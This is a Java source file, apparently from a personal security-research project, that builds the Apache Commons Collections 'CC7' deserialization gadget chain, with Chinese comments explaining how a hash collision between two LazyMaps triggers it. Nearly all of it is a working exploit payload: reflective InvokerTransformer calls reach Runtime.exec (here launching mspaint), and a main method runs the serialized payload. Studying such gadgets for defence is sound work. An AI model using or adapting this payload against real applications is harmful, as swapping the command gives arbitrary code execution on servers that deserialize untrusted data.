package com.pinger.javasec.ysoserial;

import com.pinger.javasec.util.SerialUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @author : p1n93r
 * @date : 2021/4/2 17:28
 * CC7 Gadget研究
 * 底层也是LazyMap，只不过现在是利用HashTable的hash碰撞触发HashMap#hash(TiedMapEntry)
 * 然后调用TiedMapEntry#hashCode()，进而触发TiedMapEntry#getValue()-->LazyMap#get()
 */
public class CC7 {

    public static Object getPayload() throws Exception{
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(1)
        });

        Transformer[] trueTransformer = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"mspaint"})
        };

        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();

        // 让两个LazyMap的hashcode相同，于是HashTable反序列化时，会出现hash碰撞
        // 且key不能一样，否则LazyMap.get(key)中不会触发transformer
        hashMap1.put("p1n93r",1);
        hashMap2.put("p1n93s",6);

        Map lazyMap1 = LazyMap.decorate(hashMap1, chainedTransformer);
        Map lazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);

        // 使用HashTable和HashMap都一样，只要产生hash碰撞即可
        HashMap<Object, Object> res = new HashMap<>();
        res.put(lazyMap1,1);
        res.put(lazyMap2,2);

        // 最后记得把真正的执行链放入chainedTransformer
        Class<? extends ChainedTransformer> chainedTransformerClass = chainedTransformer.getClass();
        Field iTransformers = chainedTransformerClass.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer,trueTransformer);

        // 因为HashMap#put时就发生了hash碰撞，所以导致LazyMap1内部新增了一个键值对：{"p1n93s",1}
        // 需要删除，防止反序列化时LazyMap1#get("p1n93s")中不会进入transformer
        lazyMap1.remove("p1n93s");

        return res;
    }


    public static void main(String[] args) throws Exception{
        Object payload = getPayload();
        SerialUtil.runPayload(payload);
    }
}
